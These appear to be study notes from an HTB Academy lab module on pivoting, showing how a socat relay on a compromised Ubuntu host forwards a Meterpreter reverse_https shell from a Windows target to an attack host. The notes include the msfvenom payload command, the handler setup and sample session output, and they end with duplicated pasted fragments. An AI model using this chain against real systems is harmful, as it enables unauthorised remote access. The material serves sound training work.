**Module:** Pivoting, Tunneling, and Port Forwarding — Section 6 / 18

---

## What is Socat

A bidirectional relay tool. It creates a pipe between two network channels — no SSH required. In pivoting, it acts as a **dumb redirector**: anything that arrives on one port gets forwarded to another IP:port, no questions asked.

---

## The Problem

```
Attack Host          Pivot Host (Ubuntu)       Windows Target
10.10.14.18          10.129.202.64             172.16.5.x
                     172.16.5.129

Windows can reach Ubuntu.
Windows CANNOT reach 10.10.14.18 directly.
```

**Solution:** Run socat on Ubuntu. Windows connects to Ubuntu, socat pipes everything to your attack host.

---

## How It Works

```
Windows → Ubuntu:8080 → [socat pipe] → Attack Host:80 → MSF handler
```

Windows thinks it's talking to Ubuntu. Ubuntu is just passing bytes through. MSF catches the shell on the other end.

No SSH tunnel. No Meterpreter session. Just raw TCP forwarding.

---

## Full Attack Chain

### Step 1 — Start socat on pivot host (Ubuntu)

bash

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

- Listens on Ubuntu port `8080`
- Forwards everything to attack host port `80`
- `fork` = handle multiple connections

### Step 2 — Generate payload (points to Ubuntu, not attack host)

bash

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=172.16.5.129 \
  LPORT=8080 \
  -f exe -o backupscript.exe
```

> Payload connects to Ubuntu:8080. Socat relays to attack host:80.

### Step 3 — Start MSF handler on attack host (listening on port 80)

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 80
run
```

### Step 4 — Transfer and execute payload on Windows target

Use any available method (SMB, HTTP server, RDP file copy etc.)

### Step 5 — Shell arrives at MSF

```
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1)
meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

> Connection shows as `127.0.0.1` on MSF side — expected, traffic came through socat pipe.

---

## Socat Syntax Breakdown

bash

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
#     └─ listen here        └─ forward to here
```

|Part|Meaning|
|---|---|
|`TCP4-LISTEN:8080`|Listen on port 8080 (IPv4 TCP)|
|`fork`|Spawn a new process per connection (handle multiple)|
|`TCP4:10.10.14.18:80`|Forward to attack host port 80|

---

## Socat vs SSH Tunneling

||Socat|SSH `-R` tunnel|
|---|---|---|
|Requires SSH|No|Yes|
|Requires existing session|No|Yes|
|Setup complexity|Single command on pivot host|SSH command from attack host|
|Flexibility|TCP redirect only|Encrypted, more control|
|Use case|Quick relay when you have shell on pivot|When SSH access available|

---

## Key Point

Socat doesn't care what the traffic is — HTTP, HTTPS, raw TCP — it just moves bytes. The payload uses `reverse_https` but socat still relays it fine because it's all TCP underneath.

---

## Tags

`#htb` `#cpts` `#pivoting` `#socat` `#redirection` `#reverseShell` `#msfvenom` `#noSSH`

### Content

![1785786693096_image.png](/api/0d32e944-2a5f-4464-bfe8-458db762748a/files/b1e50d02-5f2d-4d2d-b824-90da699f501c/preview)

HTB Academy Logo Pivoting, Tunneling, and Port Forwarding Pivoting, Tunneling, and Port Forwarding 22.22% Section 5 / 18 Go to Questions Meterpreter Tunneling & Port Forwarding Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host),

pasted

HTB Academy Logo Pivoting, Tunneling, and Port Forwarding Pivoting, Tunneling, and Port Forwarding 22.22% Section 5 / 18 Go to Questions Meterpreter Tunneling & Port Forwarding Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host),

pasted